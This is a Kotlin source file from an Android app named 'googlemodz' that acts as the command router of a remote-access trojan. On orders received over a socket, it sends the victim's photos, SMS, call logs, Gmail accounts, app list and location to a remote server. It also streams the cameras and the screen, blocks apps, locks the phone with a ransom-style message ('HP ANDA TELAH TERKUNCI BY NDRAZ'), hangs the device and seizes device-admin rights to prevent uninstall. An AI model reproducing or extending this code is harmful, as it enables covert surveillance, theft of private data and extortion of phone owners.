package com.app.googlemodz

import android.content.Context
import android.content.Intent
import android.net.Uri
import org.json.JSONObject

object CommandRouter {
    private fun emitData(obj: JSONObject) {
        try {
            if (SocketHolder.socket != null && SocketHolder.socket!!.connected()) {
                SocketHolder.socket!!.emit("device-data", obj)
            }
        } catch (e: Exception) {}
    }

    fun route(ctx: Context, data: JSONObject) {
        val action = data.optString("action")
        val payload = data.optJSONObject("payload") ?: JSONObject()

        when (action) {
            "gallery_list" -> GalleryRechive.listImages(ctx, ::emitData)
            "gallery_get" -> GalleryRechive.sendImage(ctx, payload.optString("id"), ::emitData)
            "sms_list" -> SmsRechive.sendAllSms(ctx, ::emitData)
            "call_log" -> CallRechive.sendAllCalls(ctx, ::emitData)
            "gmail_list" -> GmailRechive.listAccounts(ctx, ::emitData)
            "app_list" -> AppsRechive.listApps(ctx, ::emitData)
            "app_block" -> {
                val pkgTarget = payload.optString("pkg", "")
                val isBlocked = payload.optBoolean("blocked", false)
                val intent = Intent(if (isBlocked) "com.sync.xxx.UNBLOCK_APP" else "com.sync.xxx.BLOCK_APP")
                intent.putExtra("package", pkgTarget)
                ctx.sendBroadcast(intent)
            }
            "location_get" -> LocationService.sendLast(ctx, ::emitData)
            "flashlight_on" -> FlashlightController.set(ctx, true)
            "flashlight_off" -> FlashlightController.stopBlink(ctx)
            "flashlight_blink" -> FlashlightController.blink(ctx, payload.optInt("ms", 150))
            "camera_front" -> CameraStreamer.start(ctx, 0, ::emitData)
            "camera_back" -> CameraStreamer.start(ctx, 1, ::emitData)
            "camera_stop" -> CameraStreamer.stop()
            "screen_start" -> {
                val intent = Intent(ctx, MainActivity::class.java)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                intent.putExtra("is_screen_start", true)
                ctx.startActivity(intent)
            }
            "screen_stop" -> ScreenStreamer.stop(ctx)
            "lock_start" -> LockService.start(ctx, payload.optString("pin", "1234"), payload.optString("message", "HP ANDA TELAH TERKUNCI BY NDRAZ"))
            "lock_stop" -> LockService.stop(ctx)
            "hang_start" -> HangDevice.start(ctx)
            "hang_stop" -> HangDevice.stop(ctx)
            "anti_uninstall_toggle" -> {
                val enable = payload.optBoolean("enable", true)
                if (enable) AntiUninstallHelper.requestAdminIfNeeded(ctx)
                else AntiUninstallHelper.disable(ctx)
            }
            "open_url" -> {
                val url = payload.optString("url", "")
                if (url.isNotEmpty()) {
                    val i = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(i)
                }
            }
        }
    }
}
